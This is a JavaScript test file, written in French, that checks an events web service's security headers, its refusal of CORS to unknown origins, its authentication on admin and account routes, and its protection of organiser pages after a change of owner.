test("sécurité : en-têtes sur toutes les réponses, aucune page HTML du serveur n'exécute de script", async () => {
  const e = env();
  for (const chemin of ["/agenda", "/v1/sorties?dep=03", "/admin/list", "/inconnu"]) {
    const r = await appel(e, chemin);
    assert.equal(r.h.get("X-Content-Type-Options"), "nosniff", chemin);
    assert.match(r.h.get("Content-Security-Policy") || "", /frame-ancestors 'none'/, chemin);
    assert.ok(r.h.get("Strict-Transport-Security"), chemin);
  }
  const p = await appel(e, "/newsletter/stop?c=000000000000000000000000&s=00000000000000000000000000000000");
  assert.match(p.h.get("Content-Type"), /text\/html/); assert.match(p.h.get("Content-Security-Policy"), /default-src 'none'/);
});

test("sécurité : un site inconnu n'obtient pas le CORS, l'espace éditeur exige le code", async () => {
  const e = env();
  const r = await appel(e, "/agenda", { headers: { Origin: "https://pirate.test" } });
  assert.notEqual(r.h.get("Access-Control-Allow-Origin"), "https://pirate.test");
  assert.notEqual(r.h.get("Access-Control-Allow-Origin"), "*");
  for (const c of ["/admin/list", "/admin/cles", "/admin/orgs"]) assert.equal((await appel(e, c)).statut, 401, c);
  assert.equal((await appel(e, "/compte")).statut, 401);
  assert.equal((await appel(e, "/compte/export", { headers: { Authorization: "Bearer " + "a".repeat(64) } })).statut, 401);
});

test("sécurité : une page organisateur reprise par un autre compte n'est jamais modifiable par l'ancien", async () => {
  const e = envC();
  const a = await inscrire(e, "ancien@exemple.fr"), b = await inscrire(e, "nouveau@exemple.fr");
  const ha = { Authorization: "Bearer " + a.session, "Content-Type": "application/json" }, hb = { Authorization: "Bearer " + b.session, "Content-Type": "application/json" };
  const slug = (await appel(e, "/compte/org", { headers: ha, body: { nom: "Comité des fêtes" } })).j.compte.org.slug;
  // la page passe à un autre compte (suppression par l'éditeur puis nouvelle création), l'ancien compte garde une copie périmée
  const o = JSON.parse(e.DLC.m.get("org:" + slug)); o.id = JSON.parse(e.DLC.m.get("ses:" + await (await import(path.join(RACINE, "worker/comptes.js"))).empreinte(b.session))).id;
  e.DLC.m.set("org:" + slug, JSON.stringify(o));
  assert.equal((await appel(e, "/compte/org/logo", { headers: ha, body: { image: "data:image/png;base64,AAAA" } })).statut, 403);
  const ev = { t: "Sortie usurpée", cat: "fete", s: "2099-06-01", w: "Moulins", z: "03", lat: 46.56, lon: 3.33 };
  assert.equal((await appel(e, "/compte/sorties", { headers: ha, body: ev })).statut, 403);
  const r = await appel(e, "/compte/org", { headers: ha, body: { nom: "Comité des fêtes" } });
  assert.equal(r.statut, 200); assert.notEqual(r.j.compte.org.slug, slug);  // une nouvelle page, pas celle de l'autre
  assert.equal(JSON.parse(e.DLC.m.get("org:" + slug)).id, o.id);
  void hb;
});
